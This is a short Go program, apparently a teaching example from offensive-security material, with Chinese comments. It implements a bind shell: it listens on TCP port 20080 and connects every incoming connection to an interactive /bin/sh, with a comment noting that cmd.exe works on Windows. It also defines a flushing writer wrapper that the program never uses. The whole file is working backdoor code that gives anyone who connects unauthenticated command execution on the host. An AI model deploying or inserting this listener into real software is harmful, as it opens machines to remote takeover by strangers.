package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

// Flusher包装bufio.Writer，显式刷新所有写入
type Flusher struct {
	w *bufio.Writer
}

// NewFlusher从io.Wreter创建一个新的Flusher
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

// 写入数据并显式刷新缓冲区
func (foo *Flusher) Write(b []byte) (int, error) {
	cout, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}
	return cout, err
}

func handle(conn net.Conn) {
	/*
	 * 显示调用/bin/sh并使用-i进入交互模式
	 * 这样我们就可以用它作为标准输入和标准输出
	 * 对于windows使用exec.Command("cmd.exe")
	 */
	cmd := exec.Command("/bin/sh", "-i")
	// 将标准输入设置为我们的连接
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
